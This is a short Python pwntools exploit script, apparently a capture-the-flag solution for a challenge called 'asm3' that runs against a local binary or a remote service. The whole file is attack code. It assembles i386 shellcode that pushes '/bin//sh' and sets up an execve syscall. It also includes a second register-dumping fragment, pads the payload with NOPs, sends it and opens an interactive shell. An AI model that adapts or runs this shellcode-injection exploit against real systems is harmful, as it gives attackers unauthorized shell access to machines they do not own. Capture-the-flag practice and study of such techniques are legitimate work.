#!/usr/bin/python
from pwn import *
import hashlib

context.log_level = 'DEBUG'
random_str = lambda n: ''.join([random.choice(string.lowercase) for i in xrange(n)])
local = True

context.arch = 'i386'
if local:
  p = process('./asm3')
  p.recvuntil('shellcode:')

  raw_input()

else:
  p = remote('asm3.eatpwnnosleep.com', 1234)
  p.recvuntil('starts with ')
  start = p.recvuntil('and')[:-4]
  p.recvuntil('NULL bytes')
  p.send(raw_input().replace('\n', ''))
  p.interactive()


sc = '''
mov bl, 0x80\n
mov esp, dword ptr gs:[ebx]\n
mov bx, 0x158c
mov edi, dword ptr gs:[ebx]\n
mov al, 0x0b\n
push 0x68732f2f\n
push 0x6e69622f\n
mov ebx, esp\n
jmp edi\n
'''

dump_sc = '''
mov eax, dword ptr gs:[ebx+0x4]\n
mov ecx, dword ptr gs:[ebx+0x8]\n
mov edx, dword ptr gs:[ebx+0xc]\n
mov esi, dword ptr gs:[ebx+0x10]\n
mov edi, dword ptr gs:[ebx+0x14]\n
mov ebp, dword ptr gs:[ebx+0x18]\n
push 0x6e69622f\n
'''

sc = asm(sc)
print disasm(sc)
print len(sc)
p.send(sc.ljust(30, '\x90'))


p.interactive()
